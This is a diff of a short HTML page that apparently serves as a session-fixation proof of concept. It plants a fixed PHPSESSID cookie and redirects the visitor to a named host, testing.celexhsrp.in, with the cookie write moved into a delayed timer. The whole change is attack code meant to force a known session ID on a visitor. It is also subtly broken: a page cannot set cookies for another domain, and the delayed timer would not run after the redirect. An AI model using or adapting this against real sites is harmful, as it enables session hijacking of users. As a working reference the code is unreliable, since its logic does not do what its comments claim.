@@ -5,12 +5,21 @@
 </head>
 <body>
     <script>
-        // JavaScript to set a cookie and redirect to another domain
-        document.cookie = "PHPSESSID=ISOAH1234; domain=yourtarget.com; path=/; SameSite=None; Secure";
-        
-        // Redirect to the target URL
-        window.location.href = "https://target.com";
+        // Redirect to the target site
+        window.location.href = "https://testing.celexhsrp.in";
+
+        // Function to set the cookie after a delay
+        function setCookieAfterDelay() {
+            // Wait for 5 seconds before setting the cookie
+            setTimeout(function() {
+                document.cookie = "PHPSESSID=ISOAH1234; domain=testing.celexhsrp.in; path=/; SameSite=None; Secure";
+                console.log("Cookie has been set.");
+            }, 5000);
+        }
+
+        // Add an event listener to set the cookie after redirect
+        window.addEventListener('load', setCookieAfterDelay);
     </script>
-    <p>If you are not redirected, click <a href="https://target.com">here</a>.</p>
+    <p>If you are not redirected, click <a href="https://testing.celexhsrp.in">here</a>.</p>
 </body>
 </html>
